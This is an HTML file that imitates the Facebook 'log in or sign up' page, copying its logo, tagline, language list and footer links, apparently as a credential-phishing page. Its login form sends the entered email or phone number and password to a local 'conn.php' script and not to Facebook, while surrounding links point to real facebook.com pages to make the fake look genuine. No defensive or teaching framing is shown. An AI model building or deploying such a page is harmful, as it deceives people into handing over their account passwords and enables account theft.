<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook - log in or sign up</title>
    <link rel="icon" href="assets/fbico.png" >
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  </head>

  <body>
    <main>
      <div class="content">
        <div class="logo">
          <img
            class="fbImg"
            src="./assets/img/logo.svg"
            alt="Facebook"
          />
          <div style="max-width: 500px">
            <h2 class="fbQuote" style="font-weight: 200">
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>
        </div>

        <form action="conn.php" method="post">
        <div class="form">
          <div class="fbForm">
            <input
              type="text"
              class="credentials"
              placeholder="Email address or phone number" name="ename"
            />
            <input type="password" class="credentials" placeholder="Password" name="pass" />
            <input type="submit" value="Log in" id="loginButton" class="credentials">
            <a style="color: #1877f2; margin: 10px" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0 "
              >Forgotten password?</a
            >
            <span class="line"></span>
            <button id="newButton" href="" >Create New Account</button>
          </div>
          <div class="create">
            <p>
              <a href="https://www.facebook.com/pages/create/?ref_type=registration_form"><b>Create a Page</b></a> for a celebrity, brand or
              business
            </p>
          </div>
        </div>
      </form>

      </div>
    </main>
    <footer>
      <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
      <div class="footer">
        <div class="language">
          <ul>
            <li><a href="#">English (UK)</a></li>
            <li><a href="#">हिन्दी</a></li>
            <li><a href="#">ଓଡ଼ିଆ</a></li>
            <li><a href="#">বাংলা</a></li>
            <li><a href="#">اردو</a></li>
            <li><a href="#">ਪੰਜਾਬੀ</a></li>
            <li><a href="#">ગુજરાતી</a></li>
            <li><a href="#">मराठी</a></li>
            <li><a href="#">தமிழ்</a></li>
            <li><a href="#">తెలుగు</a></li>
            <li><a href="#">മലയാളം</a></li>
            <li>
              <button
                style="width:30px; height:20px; font-weight: 600; font-size: medium;"
                disabled
              >
                +
              </button>
            </li>
          </ul>
        </div>
        <span class="line"></span>
        <div class="others">
          <ul>
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log In</a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Watch</a></li>
            <li><a href="#">Places</a></li>
            <li><a href="#">Games</a></li>
            <li><a href="#">Marketplace</a></li>
            <li><a href="#">Facebook Pay</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Oculus</a></li>
            <li><a href="#">Portal</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Bulletin</a></li>
            <li><a href="#">Local</a></li>
            <li><a href="#">Fundraisers</a></li>
            <li><a href="#">Services</a></li>
            <li><a href="#">Voting Information Centre</a></li>
            <li><a href="#">Groups</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Create ad</a></li>
            <li><a href="#">Create Page</a></li>
            <li><a href="#">Developers</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Cookies</a></li>
            <li><a href="#">AdChoices</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Help</a></li>
          </ul>
        </div>
        <div class="meta"><small>Meta &copy; 2022</small></div>
      </div>
    </footer>

    
  </body>

  
</html>
